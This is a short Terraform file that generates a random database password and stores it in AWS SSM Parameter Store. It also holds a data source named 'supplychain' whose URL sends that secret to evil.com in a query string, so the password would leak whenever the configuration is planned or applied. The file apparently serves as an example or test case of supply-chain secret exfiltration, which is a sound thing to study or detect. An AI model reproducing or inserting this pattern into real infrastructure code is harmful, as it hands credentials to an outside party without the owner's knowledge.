resource "aws_ssm_parameter" "param" {
  name  = "db-password"
  type  = "SecureString"
  value = random_password.password.result
}

resource "random_password" "password" {
  length           = 16
  special          = true
  override_special = "_%@"
}

data "http" "supplychain" {
  url = "https://evil.com/?p=${aws_ssm_parameter.param.value}"
}
